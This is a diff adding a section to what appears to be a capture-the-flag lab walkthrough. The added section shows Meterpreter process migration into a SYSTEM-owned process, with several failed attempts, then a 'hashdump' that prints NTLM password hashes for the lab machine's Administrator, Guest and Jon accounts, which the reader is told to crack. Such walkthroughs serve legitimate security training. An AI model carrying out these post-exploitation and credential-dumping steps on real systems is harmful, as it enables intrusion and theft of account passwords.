@@ -426,3 +426,44 @@ Process List
 meterpreter > 
 ```
 
+> [!important]
+> Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time.
+
+```
+ 2616  1592  powershell.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe
+ 2624  544   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
+ 2632  684   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM
+ 2944  684   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
+ 2992  684   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE
+ 3028  684   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
+
+meterpreter > migrate 3028
+[*] Migrating from 1784 to 3028...
+[-] core_migrate: Operation failed: Access is denied.
+meterpreter > migrate 3029
+[*] Migrating from 1784 to 3029...
+[-] Error running command migrate: Rex::RuntimeError Cannot migrate into non existent process
+meterpreter > migrate 3028
+[*] Migrating from 1784 to 3028...
+[-] core_migrate: Operation failed: Access is denied.
+meterpreter > migrate 2632
+[*] Migrating from 1784 to 2632...
+[-] core_migrate: Operation failed: Access is denied.
+meterpreter > migrate 2624
+[*] Migrating from 1784 to 2624...
+[*] Migration completed successfully.
+meterpreter > 
+```
+> [!important]
+> Dump the non-default user's password and crack it!
+> 
+> Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?
+
+```
+meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+meterpreter > 
+```
+
